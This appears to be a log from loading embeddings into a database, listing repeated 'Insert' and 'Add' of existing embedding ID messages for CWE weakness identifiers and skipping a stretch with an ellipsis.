# Insert of existing embedding ID: CWE-548
# Insert of existing embedding ID: CWE-549
# Insert of existing embedding ID: CWE-55
# Insert of existing embedding ID: CWE-550
# Insert of existing embedding ID: CWE-551
# Insert of existing embedding ID: CWE-552
# Insert of existing embedding ID: CWE-553
# Insert of existing embedding ID: CWE-554
# Insert of existing embedding ID: CWE-555
# Insert of existing embedding ID: CWE-556
# Insert of existing embedding ID: CWE-558
# Insert of existing embedding ID: CWE-56
# Insert of existing embedding ID: CWE-560
# Insert of existing embedding ID: CWE-561
# Insert of existing embedding ID: CWE-562
# Insert of existing embedding ID: CWE-563
# Insert of existing embedding ID: CWE-564
# Insert of existing embedding ID: CWE-565
# Insert of existing embedding ID: CWE-566
# Insert of existing embedding ID: CWE-567
# Insert of existing embedding ID: CWE-568
# Insert of existing embedding ID: CWE-57
# Insert of existing embedding ID: CWE-570
# Insert of existing embedding ID: CWE-571
# Insert of existing embedding ID: CWE-572
# Insert of existing embedding ID: CWE-573
# Insert of existing embedding ID: CWE-574
# Insert of existing embedding ID: CWE-575
# Insert of existing embedding ID: CWE-576
# Insert of existing embedding ID: CWE-577
# Insert of existing embedding ID: CWE-578
# Insert of existing embedding ID: CWE-579
# Insert of existing embedding ID: CWE-58
# Insert of existing embedding ID: CWE-580
# Insert of existing embedding ID: CWE-581
# Insert of existing embedding ID: CWE-582
# Insert of existing embedding ID: CWE-583
# Insert of existing embedding ID: CWE-584
# Insert of existing embedding ID: CWE-585
# Insert of existing embedding ID: CWE-586
# Insert of existing embedding ID: CWE-587
# Insert of existing embedding ID: CWE-588
# Insert of existing embedding ID: CWE-589
# Insert of existing embedding ID: CWE-59
# Insert of existing embedding ID: CWE-590
# Insert of existing embedding ID: CWE-591
# Insert of existing embedding ID: CWE-592
# Insert of existing embedding ID: CWE-593
# Insert of existing embedding ID: CWE-594
# Insert of existing embedding ID: CWE-595
# Insert of existing embedding ID: CWE-596
# Insert of existing embedding ID: CWE-597
# Insert of existing embedding ID: CWE-598
# Insert of existing embedding ID: CWE-599
# Insert of existing embedding ID: CWE-6
# Insert of existing embedding ID: CWE-600
# Insert of existing embedding ID: CWE-601
# Insert of existing embedding ID: CWE-602
# Insert of existing embedding ID: CWE-603
# Insert of existing embedding ID: CWE-605
# Insert of existing embedding ID: CWE-606
# Insert of existing embedding ID: CWE-607
# Insert of existing embedding ID: CWE-608
# Insert of existing embedding ID: CWE-609
# Insert of existing embedding ID: CWE-61
# Insert of existing embedding ID: CWE-610
# Insert of existing embedding ID: CWE-611
# Insert of existing embedding ID: CWE-612
# Insert of existing embedding ID: CWE-613
# Insert of existing embedding ID: CWE-614
# Insert of existing embedding ID: CWE-615
# Insert of existing embedding ID: CWE-616
# Insert of existing embedding ID: CWE-617
# Insert of existing embedding ID: CWE-618
# Insert of existing embedding ID: CWE-619
# Insert of existing embedding ID: CWE-62
# Insert of existing embedding ID: CWE-620
# Insert of existing embedding ID: CWE-621
# Insert of existing embedding ID: CWE-622
# Insert of existing embedding ID: CWE-623
# Insert of existing embedding ID: CWE-624
# Insert of existing embedding ID: CWE-625
# Insert of existing embedding ID: CWE-626
# Insert of existing embedding ID: CWE-627
# Insert of existing embedding ID: CWE-628
# Insert of existing embedding ID: CWE-636
# Insert of existing embedding ID: CWE-637
# Insert of existing embedding ID: CWE-638
# Insert of existing embedding ID: CWE-639
# Insert of existing embedding ID: CWE-64
# Insert of existing embedding ID: CWE-640
# Insert of existing embedding ID: CWE-641
# Insert of existing embedding ID: CWE-642
# Insert of existing embedding ID: CWE-643
# Insert of existing embedding ID: CWE-644
# Insert of existing embedding ID: CWE-645
# Insert of existing embedding ID: CWE-646
# Insert of existing embedding ID: CWE-647
# Insert of existing embedding ID: CWE-648
# Insert of existing embedding ID: CWE-649
# Insert of existing embedding ID: CWE-65
# Insert of existing embedding ID: CWE-650
# Insert of existing embedding ID: CWE-651
# Insert of existing embedding ID: CWE-652
# Insert of existing embedding ID: CWE-653
# Insert of existing embedding ID: CWE-654
# Insert of existing embedding ID: CWE-655
# Insert of existing embedding ID: CWE-656
# Insert of existing embedding ID: CWE-657
# Insert of existing embedding ID: CWE-66
# Insert of existing embedding ID: CWE-662
# Insert of existing embedding ID: CWE-663
# Insert of existing embedding ID: CWE-664
# Insert of existing embedding ID: CWE-665
# Insert of existing embedding ID: CWE-666
# Insert of existing embedding ID: CWE-667
# Insert of existing embedding ID: CWE-668
# Insert of existing embedding ID: CWE-669
# Insert of existing embedding ID: CWE-67
# Insert of existing embedding ID: CWE-670
# Insert of existing embedding ID: CWE-671
# Insert of existing embedding ID: CWE-672
# Insert of existing embedding ID: CWE-673
# Insert of existing embedding ID: CWE-674
# Insert of existing embedding ID: CWE-675
# Insert of existing embedding ID: CWE-676
# Insert of existing embedding ID: CWE-680
# Insert of existing embedding ID: CWE-681
# Insert of existing embedding ID: CWE-682
# Insert of existing embedding ID: CWE-683
# Insert of existing embedding ID: CWE-684
# Insert of existing embedding ID: CWE-685
# Insert of existing embedding ID: CWE-686
# Insert of existing embedding ID: CWE-687
# Insert of existing embedding ID: CWE-688
# Insert of existing embedding ID: CWE-689
# Insert of existing embedding ID: CWE-69
# Insert of existing embedding ID: CWE-690
# Insert of existing embedding ID: CWE-691
# Insert of existing embedding ID: CWE-692
# Insert of existing embedding ID: CWE-693
# Insert of existing embedding ID: CWE-694
# Insert of existing embedding ID: CWE-695
# Insert of existing embedding ID: CWE-696
# Insert of existing embedding ID: CWE-697
# Insert of existing embedding ID: CWE-698
# Insert of existing embedding ID: CWE-7
# Insert of existing embedding ID: CWE-703
# Insert of existing embedding ID: CWE-704
# Insert of existing embedding ID: CWE-705
# Insert of existing embedding ID: CWE-706
# Insert of existing embedding ID: CWE-707
# Insert of existing embedding ID: CWE-708
# Insert of existing embedding ID: CWE-71
# Insert of existing embedding ID: CWE-710
# Insert of existing embedding ID: CWE-72
# Insert of existing embedding ID: CWE-73
# Insert of existing embedding ID: CWE-732
# Insert of existing embedding ID: CWE-733
# Insert of existing embedding ID: CWE-74
# Insert of existing embedding ID: CWE-749
# Insert of existing embedding ID: CWE-75
# Insert of existing embedding ID: CWE-754
# Insert of existing embedding ID: CWE-755
# Insert of existing embedding ID: CWE-756
# Insert of existing embedding ID: CWE-757
# Insert of existing embedding ID: CWE-758
# Insert of existing embedding ID: CWE-759
# Insert of existing embedding ID: CWE-76
# Insert of existing embedding ID: CWE-760
# Insert of existing embedding ID: CWE-761
# Insert of existing embedding ID: CWE-762
# Insert of existing embedding ID: CWE-763
# Insert of existing embedding ID: CWE-764
# Insert of existing embedding ID: CWE-765
# Insert of existing embedding ID: CWE-766
# Insert of existing embedding ID: CWE-767
# Insert of existing embedding ID: CWE-768
# Insert of existing embedding ID: CWE-769
# Insert of existing embedding ID: CWE-77
# Insert of existing embedding ID: CWE-770
# Insert of existing embedding ID: CWE-771
# Insert of existing embedding ID: CWE-772
# Insert of existing embedding ID: CWE-773
# Insert of existing embedding ID: CWE-774
# Insert of existing embedding ID: CWE-775
# Insert of existing embedding ID: CWE-776
# Insert of existing embedding ID: CWE-777
# Insert of existing embedding ID: CWE-778
# Insert of existing embedding ID: CWE-779
# Insert of existing embedding ID: CWE-78
# Insert of existing embedding ID: CWE-780
# Insert of existing embedding ID: CWE-781
# Insert of existing embedding ID: CWE-782
# Insert of existing embedding ID: CWE-783
# Insert of existing embedding ID: CWE-784
# Insert of existing embedding ID: CWE-785
# Insert of existing embedding ID: CWE-786
# Insert of existing embedding ID: CWE-787
# Insert of existing embedding ID: CWE-788
# Insert of existing embedding ID: CWE-789
# Insert of existing embedding ID: CWE-79
# Insert of existing embedding ID: CWE-790
# Insert of existing embedding ID: CWE-791
# Insert of existing embedding ID: CWE-792
# Insert of existing embedding ID: CWE-793
# Insert of existing embedding ID: CWE-794
# Insert of existing embedding ID: CWE-795
# Insert of existing embedding ID: CWE-796
# Insert of existing embedding ID: CWE-797
# Insert of existing embedding ID: CWE-798
# Insert of existing embedding ID: CWE-799
# Insert of existing embedding ID: CWE-8
# Insert of existing embedding ID: CWE-80
# Insert of existing embedding ID: CWE-804
# Insert of existing embedding ID: CWE-805
# Insert of existing embedding ID: CWE-806
# Insert of existing embedding ID: CWE-807
# Insert of existing embedding ID: CWE-81
# Insert of existing embedding ID: CWE-82
# Insert of existing embedding ID: CWE-820
# Insert of existing embedding ID: CWE-821
# Insert of existing embedding ID: CWE-822
# Insert of existing embedding ID: CWE-823
# Insert of existing embedding ID: CWE-824
# Insert of existing embedding ID: CWE-825
# Insert of existing embedding ID: CWE-826
# Insert of existing embedding ID: CWE-827
# Insert of existing embedding ID: CWE-828
# Insert of existing embedding ID: CWE-829
# Insert of existing embedding ID: CWE-83
# Insert of existing embedding ID: CWE-830
# Insert of existing embedding ID: CWE-831
# Insert of existing embedding ID: CWE-832
# Insert of existing embedding ID: CWE-833
# Insert of existing embedding ID: CWE-834
# Insert of existing embedding ID: CWE-835
# Insert of existing embedding ID: CWE-836
# Insert of existing embedding ID: CWE-837
# Insert of existing embedding ID: CWE-838
# Insert of existing embedding ID: CWE-839
# Insert of existing embedding ID: CWE-84
# Insert of existing embedding ID: CWE-841
# Insert of existing embedding ID: CWE-842
# Insert of existing embedding ID: CWE-843
# Insert of existing embedding ID: CWE-85
# Insert of existing embedding ID: CWE-86
# Insert of existing embedding ID: CWE-862
# Insert of existing embedding ID: CWE-863
# Insert of existing embedding ID: CWE-87
# Insert of existing embedding ID: CWE-88
# Insert of existing embedding ID: CWE-89
# Insert of existing embedding ID: CWE-9
# Insert of existing embedding ID: CWE-90
# Insert of existing embedding ID: CWE-908
# Insert of existing embedding ID: CWE-909
# Insert of existing embedding ID: CWE-91
# Insert of existing embedding ID: CWE-910
# Insert of existing embedding ID: CWE-911
# Insert of existing embedding ID: CWE-912
# Insert of existing embedding ID: CWE-913
# Insert of existing embedding ID: CWE-914
# Insert of existing embedding ID: CWE-915
# Insert of existing embedding ID: CWE-916
# Insert of existing embedding ID: CWE-917
# Insert of existing embedding ID: CWE-918
# Insert of existing embedding ID: CWE-92
# Insert of existing embedding ID: CWE-920
# Insert of existing embedding ID: CWE-921
# Insert of existing embedding ID: CWE-922
# Insert of existing embedding ID: CWE-923
# Insert of existing embedding ID: CWE-924
# Insert of existing embedding ID: CWE-925
# Insert of existing embedding ID: CWE-926
# Insert of existing embedding ID: CWE-927
# Insert of existing embedding ID: CWE-93
# Insert of existing embedding ID: CWE-939
# Insert of existing embedding ID: CWE-94
# Insert of existing embedding ID: CWE-940
# Insert of existing embedding ID: CWE-941
# Insert of existing embedding ID: CWE-942
# Insert of existing embedding ID: CWE-943
# Insert of existing embedding ID: CWE-95
# Insert of existing embedding ID: CWE-96
# Insert of existing embedding ID: CWE-97
# Insert of existing embedding ID: CWE-98
# Insert of existing embedding ID: CWE-99
# Add of existing embedding ID: CWE-1004
# Add of existing embedding ID: CWE-1007
# Add of existing embedding ID: CWE-102
# Add of existing embedding ID: CWE-1021
# Add of existing embedding ID: CWE-1022
# Add of existing embedding ID: CWE-1023
# Add of existing embedding ID: CWE-1024
# Add of existing embedding ID: CWE-1025
# Add of existing embedding ID: CWE-103
# Add of existing embedding ID: CWE-1037
# Add of existing embedding ID: CWE-1038
# Add of existing embedding ID: CWE-1039
# Add of existing embedding ID: CWE-104
# Add of existing embedding ID: CWE-1041
# Add of existing embedding ID: CWE-1042
# Add of existing embedding ID: CWE-1043
# Add of existing embedding ID: CWE-1044
# Add of existing embedding ID: CWE-1045
# Add of existing embedding ID: CWE-1046
# Add of existing embedding ID: CWE-1047
# Add of existing embedding ID: CWE-1048
# Add of existing embedding ID: CWE-1049
# Add of existing embedding ID: CWE-105
# Add of existing embedding ID: CWE-1050
# Add of existing embedding ID: CWE-1051
# Add of existing embedding ID: CWE-1052
# Add of existing embedding ID: CWE-1053
# Add of existing embedding ID: CWE-1054
# Add of existing embedding ID: CWE-1055
# Add of existing embedding ID: CWE-1056
# Add of existing embedding ID: CWE-1057
# Add of existing embedding ID: CWE-1058
# Add of existing embedding ID: CWE-1059
# Add of existing embedding ID: CWE-106
# Add of existing embedding ID: CWE-1060
# Add of existing embedding ID: CWE-1061
# Add of existing embedding ID: CWE-1062
# Add of existing embedding ID: CWE-1063
# Add of existing embedding ID: CWE-1064
# Add of existing embedding ID: CWE-1065
# Add of existing embedding ID: CWE-1066
# Add of existing embedding ID: CWE-1067
# Add of existing embedding ID: CWE-1068
# Add of existing embedding ID: CWE-1069
# Add of existing embedding ID: CWE-107
# Add of existing embedding ID: CWE-1070
# Add of existing embedding ID: CWE-1071
# Add of existing embedding ID: CWE-1072
# Add of existing embedding ID: CWE-1073
# Add of existing embedding ID: CWE-1074
# Add of existing embedding ID: CWE-1075
# Add of existing embedding ID: CWE-1076
# Add of existing embedding ID: CWE-1077
# Add of existing embedding ID: CWE-1078
# Add of existing embedding ID: CWE-1079
# Add of existing embedding ID: CWE-108
# Add of existing embedding ID: CWE-1080
# Add of existing embedding ID: CWE-1082
# Add of existing embedding ID: CWE-1083
# Add of existing embedding ID: CWE-1084
# Add of existing embedding ID: CWE-1085
# Add of existing embedding ID: CWE-1086
# Add of existing embedding ID: CWE-1087
# Add of existing embedding ID: CWE-1088
# Add of existing embedding ID: CWE-1089
# Add of existing embedding ID: CWE-109
# Add of existing embedding ID: CWE-1090
# Add of existing embedding ID: CWE-1091
# Add of existing embedding ID: CWE-1092
# Add of existing embedding ID: CWE-1093
# Add of existing embedding ID: CWE-1094
# Add of existing embedding ID: CWE-1095
# Add of existing embedding ID: CWE-1096
# Add of existing embedding ID: CWE-1097
# Add of existing embedding ID: CWE-1098
# Add of existing embedding ID: CWE-1099
# Add of existing embedding ID: CWE-11
# Add of existing embedding ID: CWE-110
# Add of existing embedding ID: CWE-1100
# Add of existing embedding ID: CWE-1101
# Add of existing embedding ID: CWE-1102
# Add of existing embedding ID: CWE-1103
# Add of existing embedding ID: CWE-1104
# Add of existing embedding ID: CWE-1105
# Add of existing embedding ID: CWE-1106
# Add of existing embedding ID: CWE-1107
# Add of existing embedding ID: CWE-1108
# Add of existing embedding ID: CWE-1109
# Add of existing embedding ID: CWE-111
# Add of existing embedding ID: CWE-1110
# Add of existing embedding ID: CWE-1111
# Add of existing embedding ID: CWE-1112
# Add of existing embedding ID: CWE-1113
# Add of existing embedding ID: CWE-1114
# Add of existing embedding ID: CWE-1115
# Add of existing embedding ID: CWE-1116
# Add of existing embedding ID: CWE-1117
# Add of existing embedding ID: CWE-1118
# Add of existing embedding ID: CWE-1119
# Add of existing embedding ID: CWE-112
# Add of existing embedding ID: CWE-1120
# Add of existing embedding ID: CWE-1121
# Add of existing embedding ID: CWE-1122
# Add of existing embedding ID: CWE-1123
# Add of existing embedding ID: CWE-1124
# Add of existing embedding ID: CWE-1125
# Add of existing embedding ID: CWE-1126
# Add of existing embedding ID: CWE-1127
# Add of existing embedding ID: CWE-113
# Add of existing embedding ID: CWE-114
# Add of existing embedding ID: CWE-115
# Add of existing embedding ID: CWE-116
# Add of existing embedding ID: CWE-1164
# Add of existing embedding ID: CWE-117
# Add of existing embedding ID: CWE-1173
# Add of existing embedding ID: CWE-1174
# Add of existing embedding ID: CWE-1176
# Add of existing embedding ID: CWE-1177
# Add of existing embedding ID: CWE-118
# Add of existing embedding ID: CWE-1187
# Add of existing embedding ID: CWE-1188
# Add of existing embedding ID: CWE-1189
# Add of existing embedding ID: CWE-119
# Add of existing embedding ID: CWE-1190
# Add of existing embedding ID: CWE-1191
# Add of existing embedding ID: CWE-1192
# Add of existing embedding ID: CWE-1193
# Add of existing embedding ID: CWE-12
# Add of existing embedding ID: CWE-120
# Add of existing embedding ID: CWE-1204
# Add of existing embedding ID: CWE-1209
# Add of existing embedding ID: CWE-121
# Add of existing embedding ID: CWE-122
# Add of existing embedding ID: CWE-1220
# Add of existing embedding ID: CWE-1221
# Add of existing embedding ID: CWE-1222
# Add of existing embedding ID: CWE-1223
# Add of existing embedding ID: CWE-1224
# Add of existing embedding ID: CWE-1229
# Add of existing embedding ID: CWE-123
# Add of existing embedding ID: CWE-1230
# Add of existing embedding ID: CWE-1231
# Add of existing embedding ID: CWE-1232
# Add of existing embedding ID: CWE-1233
# Add of existing embedding ID: CWE-1234
# Add of existing embedding ID: CWE-1235
# Add of existing embedding ID: CWE-1236
# Add of existing embedding ID: CWE-1239
# Add of existing embedding ID: CWE-124
# Add of existing embedding ID: CWE-1240
# Add of existing embedding ID: CWE-1241
# Add of existing embedding ID: CWE-1242
# Add of existing embedding ID: CWE-1243
# Add of existing embedding ID: CWE-1244
# Add of existing embedding ID: CWE-1245
# Add of existing embedding ID: CWE-1246
# Add of existing embedding ID: CWE-1247
# Add of existing embedding ID: CWE-1248
# Add of existing embedding ID: CWE-1249
# Add of existing embedding ID: CWE-125
# Add of existing embedding ID: CWE-1250
# Add of existing embedding ID: CWE-1251
# Add of existing embedding ID: CWE-1252
# Add of existing embedding ID: CWE-1253
# Add of existing embedding ID: CWE-1254
# Add of existing embedding ID: CWE-1255
# Add of existing embedding ID: CWE-1256
# Add of existing embedding ID: CWE-1257
# Add of existing embedding ID: CWE-1258
# Add of existing embedding ID: CWE-1259
# Add of existing embedding ID: CWE-126
# Add of existing embedding ID: CWE-1260
# Add of existing embedding ID: CWE-1261
# Add of existing embedding ID: CWE-1262
# Add of existing embedding ID: CWE-1263
# Add of existing embedding ID: CWE-1264
# Add of existing embedding ID: CWE-1265
# Add of existing embedding ID: CWE-1266
# Add of existing embedding ID: CWE-1267
# Add of existing embedding ID: CWE-1268
# Add of existing embedding ID: CWE-1269
# Add of existing embedding ID: CWE-127
# Add of existing embedding ID: CWE-1270
# Add of existing embedding ID: CWE-1271
# Add of existing embedding ID: CWE-1272
# Add of existing embedding ID: CWE-1273
# Add of existing embedding ID: CWE-1274
# Add of existing embedding ID: CWE-1275
# Add of existing embedding ID: CWE-1276
# Add of existing embedding ID: CWE-1277
# Add of existing embedding ID: CWE-1278
# Add of existing embedding ID: CWE-1279
# Add of existing embedding ID: CWE-128
# Add of existing embedding ID: CWE-1280
# Add of existing embedding ID: CWE-1281
# Add of existing embedding ID: CWE-1282
# Add of existing embedding ID: CWE-1283
# Add of existing embedding ID: CWE-1284
# Add of existing embedding ID: CWE-1285
# Add of existing embedding ID: CWE-1286
# Add of existing embedding ID: CWE-1287
# Add of existing embedding ID: CWE-1288
# Add of existing embedding ID: CWE-1289
# Add of existing embedding ID: CWE-129
# Add of existing embedding ID: CWE-1290
# Add of existing embedding ID: CWE-1291
# Add of existing embedding ID: CWE-1292
# Add of existing embedding ID: CWE-1293
# Add of existing embedding ID: CWE-1294
# Add of existing embedding ID: CWE-1295
# Add of existing embedding ID: CWE-1296
# Add of existing embedding ID: CWE-1297
# Add of existing embedding ID: CWE-1298
# ...
# Add of existing embedding ID: CWE-409
# Add of existing embedding ID: CWE-41
# Add of existing embedding ID: CWE-410
# Add of existing embedding ID: CWE-412
# Add of existing embedding ID: CWE-413
# Add of existing embedding ID: CWE-414
# Add of existing embedding ID: CWE-415
# Add of existing embedding ID: CWE-416
# Add of existing embedding ID: CWE-419
# Add of existing embedding ID: CWE-42
# Add of existing embedding ID: CWE-420
# Add of existing embedding ID: CWE-421
# Add of existing embedding ID: CWE-422
# Add of existing embedding ID: CWE-423
# Add of existing embedding ID: CWE-424
# Add of existing embedding ID: CWE-425
# Add of existing embedding ID: CWE-426
# Add of existing embedding ID: CWE-427
# Add of existing embedding ID: CWE-428
# Add of existing embedding ID: CWE-43
# Add of existing embedding ID: CWE-430
# Add of existing embedding ID: CWE-431
# Add of existing embedding ID: CWE-432
# Add of existing embedding ID: CWE-433
# Add of existing embedding ID: CWE-434
# Add of existing embedding ID: CWE-435
# Add of existing embedding ID: CWE-436
# Add of existing embedding ID: CWE-437
# Add of existing embedding ID: CWE-439
# Add of existing embedding ID: CWE-44
# Add of existing embedding ID: CWE-440
# Add of existing embedding ID: CWE-441
# Add of existing embedding ID: CWE-443
# Add of existing embedding ID: CWE-444
# Add of existing embedding ID: CWE-446
# Add of existing embedding ID: CWE-447
# Add of existing embedding ID: CWE-448
# Add of existing embedding ID: CWE-449
# Add of existing embedding ID: CWE-45
# Add of existing embedding ID: CWE-450
# Add of existing embedding ID: CWE-451
# Add of existing embedding ID: CWE-453
# Add of existing embedding ID: CWE-454
# Add of existing embedding ID: CWE-455
# Add of existing embedding ID: CWE-456
# Add of existing embedding ID: CWE-457
# Add of existing embedding ID: CWE-458
# Add of existing embedding ID: CWE-459
# Add of existing embedding ID: CWE-46
# Add of existing embedding ID: CWE-460
# Add of existing embedding ID: CWE-462
# Add of existing embedding ID: CWE-463
# Add of existing embedding ID: CWE-464
# Add of existing embedding ID: CWE-466
# Add of existing embedding ID: CWE-467
# Add of existing embedding ID: CWE-468
# Add of existing embedding ID: CWE-469
# Add of existing embedding ID: CWE-47
# Add of existing embedding ID: CWE-470
# Add of existing embedding ID: CWE-471
# Add of existing embedding ID: CWE-472
# Add of existing embedding ID: CWE-473
# Add of existing embedding ID: CWE-474
# Add of existing embedding ID: CWE-475
# Add of existing embedding ID: CWE-476
# Add of existing embedding ID: CWE-477
# Add of existing embedding ID: CWE-478
# Add of existing embedding ID: CWE-479
# Add of existing embedding ID: CWE-48
# Add of existing embedding ID: CWE-480
# Add of existing embedding ID: CWE-481
# Add of existing embedding ID: CWE-482
# Add of existing embedding ID: CWE-483
# Add of existing embedding ID: CWE-484
# Add of existing embedding ID: CWE-486
# Add of existing embedding ID: CWE-487
# Add of existing embedding ID: CWE-488
# Add of existing embedding ID: CWE-489
# Add of existing embedding ID: CWE-49
# Add of existing embedding ID: CWE-491
# Add of existing embedding ID: CWE-492
# Add of existing embedding ID: CWE-493
# Add of existing embedding ID: CWE-494
# Add of existing embedding ID: CWE-495
# Add of existing embedding ID: CWE-496
# Add of existing embedding ID: CWE-497
# Add of existing embedding ID: CWE-498
# Add of existing embedding ID: CWE-499
# Add of existing embedding ID: CWE-5
# Add of existing embedding ID: CWE-50
# Add of existing embedding ID: CWE-500
# Add of existing embedding ID: CWE-501
# Add of existing embedding ID: CWE-502
# Add of existing embedding ID: CWE-506
# Add of existing embedding ID: CWE-507
# Add of existing embedding ID: CWE-508
# Add of existing embedding ID: CWE-509
# Add of existing embedding ID: CWE-51
# Add of existing embedding ID: CWE-510
# Add of existing embedding ID: CWE-511
# Add of existing embedding ID: CWE-512
# Add of existing embedding ID: CWE-514
# Add of existing embedding ID: CWE-515
# Add of existing embedding ID: CWE-516
# Add of existing embedding ID: CWE-52
# Add of existing embedding ID: CWE-520
# Add of existing embedding ID: CWE-521
# Add of existing embedding ID: CWE-522
# Add of existing embedding ID: CWE-523
# Add of existing embedding ID: CWE-524
# Add of existing embedding ID: CWE-525
# Add of existing embedding ID: CWE-526
# Add of existing embedding ID: CWE-527
# Add of existing embedding ID: CWE-528
# Add of existing embedding ID: CWE-529
# Add of existing embedding ID: CWE-53
# Add of existing embedding ID: CWE-530
# Add of existing embedding ID: CWE-531
# Add of existing embedding ID: CWE-532
# Add of existing embedding ID: CWE-533
# Add of existing embedding ID: CWE-534
# Add of existing embedding ID: CWE-535
# Add of existing embedding ID: CWE-536
# Add of existing embedding ID: CWE-537
# Add of existing embedding ID: CWE-538
# Add of existing embedding ID: CWE-539
# Add of existing embedding ID: CWE-54
# Add of existing embedding ID: CWE-540
# Add of existing embedding ID: CWE-541
# Add of existing embedding ID: CWE-542
# Add of existing embedding ID: CWE-543
# Add of existing embedding ID: CWE-544
# Add of existing embedding ID: CWE-545
# Add of existing embedding ID: CWE-546
# Add of existing embedding ID: CWE-547
# Add of existing embedding ID: CWE-548
# Add of existing embedding ID: CWE-549
# Add of existing embedding ID: CWE-55
# Add of existing embedding ID: CWE-550
# Add of existing embedding ID: CWE-551
# Add of existing embedding ID: CWE-552
# Add of existing embedding ID: CWE-553
# Add of existing embedding ID: CWE-554
# Add of existing embedding ID: CWE-555
# Add of existing embedding ID: CWE-556
# Add of existing embedding ID: CWE-558
# Add of existing embedding ID: CWE-56
# Add of existing embedding ID: CWE-560
# Add of existing embedding ID: CWE-561
# Add of existing embedding ID: CWE-562
# Add of existing embedding ID: CWE-563
# Add of existing embedding ID: CWE-564
# Add of existing embedding ID: CWE-565
# Add of existing embedding ID: CWE-566
# Add of existing embedding ID: CWE-567
# Add of existing embedding ID: CWE-568
# Add of existing embedding ID: CWE-57
# Add of existing embedding ID: CWE-570
# Add of existing embedding ID: CWE-571
# Add of existing embedding ID: CWE-572
# Add of existing embedding ID: CWE-573
# Add of existing embedding ID: CWE-574
# Add of existing embedding ID: CWE-575
# Add of existing embedding ID: CWE-576
# Add of existing embedding ID: CWE-577
# Add of existing embedding ID: CWE-578
# Add of existing embedding ID: CWE-579
# Add of existing embedding ID: CWE-58
# Add of existing embedding ID: CWE-580
# Add of existing embedding ID: CWE-581
# Add of existing embedding ID: CWE-582
# Add of existing embedding ID: CWE-583
# Add of existing embedding ID: CWE-584
# Add of existing embedding ID: CWE-585
# Add of existing embedding ID: CWE-586
# Add of existing embedding ID: CWE-587
# Add of existing embedding ID: CWE-588
# Add of existing embedding ID: CWE-589
# Add of existing embedding ID: CWE-59
# Add of existing embedding ID: CWE-590
# Add of existing embedding ID: CWE-591
# Add of existing embedding ID: CWE-592
# Add of existing embedding ID: CWE-593
# Add of existing embedding ID: CWE-594
# Add of existing embedding ID: CWE-595
# Add of existing embedding ID: CWE-596
# Add of existing embedding ID: CWE-597
# Add of existing embedding ID: CWE-598
# Add of existing embedding ID: CWE-599
# Add of existing embedding ID: CWE-6
# Add of existing embedding ID: CWE-600
# Add of existing embedding ID: CWE-601
# Add of existing embedding ID: CWE-602
# Add of existing embedding ID: CWE-603
# Add of existing embedding ID: CWE-605
# Add of existing embedding ID: CWE-606
# Add of existing embedding ID: CWE-607
# Add of existing embedding ID: CWE-608
# Add of existing embedding ID: CWE-609
# Add of existing embedding ID: CWE-61
# Add of existing embedding ID: CWE-610
# Add of existing embedding ID: CWE-611
# Add of existing embedding ID: CWE-612
# Add of existing embedding ID: CWE-613
# Add of existing embedding ID: CWE-614
# Add of existing embedding ID: CWE-615
# Add of existing embedding ID: CWE-616
# Add of existing embedding ID: CWE-617
# Add of existing embedding ID: CWE-618
# Add of existing embedding ID: CWE-619
# Add of existing embedding ID: CWE-62
# Add of existing embedding ID: CWE-620
# Add of existing embedding ID: CWE-621
# Add of existing embedding ID: CWE-622
# Add of existing embedding ID: CWE-623
# Add of existing embedding ID: CWE-624
# Add of existing embedding ID: CWE-625
# Add of existing embedding ID: CWE-626
# Add of existing embedding ID: CWE-627
# Add of existing embedding ID: CWE-628
# Add of existing embedding ID: CWE-636
# Add of existing embedding ID: CWE-637
# Add of existing embedding ID: CWE-638
# Add of existing embedding ID: CWE-639
# Add of existing embedding ID: CWE-64
# Add of existing embedding ID: CWE-640
# Add of existing embedding ID: CWE-641
# Add of existing embedding ID: CWE-642
# Add of existing embedding ID: CWE-643
# Add of existing embedding ID: CWE-644
# Add of existing embedding ID: CWE-645
# Add of existing embedding ID: CWE-646
# Add of existing embedding ID: CWE-647
# Add of existing embedding ID: CWE-648
# Add of existing embedding ID: CWE-649
# Add of existing embedding ID: CWE-65
# Add of existing embedding ID: CWE-650
# Add of existing embedding ID: CWE-651
# Add of existing embedding ID: CWE-652
# Add of existing embedding ID: CWE-653
# Add of existing embedding ID: CWE-654
# Add of existing embedding ID: CWE-655
# Add of existing embedding ID: CWE-656
# Add of existing embedding ID: CWE-657
# Add of existing embedding ID: CWE-66
# Add of existing embedding ID: CWE-662
# Add of existing embedding ID: CWE-663
# Add of existing embedding ID: CWE-664
# Add of existing embedding ID: CWE-665
# Add of existing embedding ID: CWE-666
# Add of existing embedding ID: CWE-667
# Add of existing embedding ID: CWE-668
# Add of existing embedding ID: CWE-669
# Add of existing embedding ID: CWE-67
# Add of existing embedding ID: CWE-670
# Add of existing embedding ID: CWE-671
# Add of existing embedding ID: CWE-672
# Add of existing embedding ID: CWE-673
# Add of existing embedding ID: CWE-674
# Add of existing embedding ID: CWE-675
# Add of existing embedding ID: CWE-676
# Add of existing embedding ID: CWE-680
# Add of existing embedding ID: CWE-681
# Add of existing embedding ID: CWE-682
# Add of existing embedding ID: CWE-683
# Add of existing embedding ID: CWE-684
# Add of existing embedding ID: CWE-685
# Add of existing embedding ID: CWE-686
# Add of existing embedding ID: CWE-687
# Add of existing embedding ID: CWE-688
# Add of existing embedding ID: CWE-689
# Add of existing embedding ID: CWE-69
# Add of existing embedding ID: CWE-690
# Add of existing embedding ID: CWE-691
# Add of existing embedding ID: CWE-692
# Add of existing embedding ID: CWE-693
# Add of existing embedding ID: CWE-694
# Add of existing embedding ID: CWE-695
# Add of existing embedding ID: CWE-696
# Add of existing embedding ID: CWE-697
# Add of existing embedding ID: CWE-698
# Add of existing embedding ID: CWE-7
# Add of existing embedding ID: CWE-703
# Add of existing embedding ID: CWE-704
# Add of existing embedding ID: CWE-705
# Add of existing embedding ID: CWE-706
# Add of existing embedding ID: CWE-707
# Add of existing embedding ID: CWE-708
# Add of existing embedding ID: CWE-71
# Add of existing embedding ID: CWE-710
# Add of existing embedding ID: CWE-72
# Add of existing embedding ID: CWE-73
# Add of existing embedding ID: CWE-732
# Add of existing embedding ID: CWE-733
# Add of existing embedding ID: CWE-74
# Add of existing embedding ID: CWE-749
# Add of existing embedding ID: CWE-75
# Add of existing embedding ID: CWE-754
# Add of existing embedding ID: CWE-755
# Add of existing embedding ID: CWE-756
# Add of existing embedding ID: CWE-757
# Add of existing embedding ID: CWE-758
# Add of existing embedding ID: CWE-759
# Add of existing embedding ID: CWE-76
# Add of existing embedding ID: CWE-760
# Add of existing embedding ID: CWE-761
# Add of existing embedding ID: CWE-762
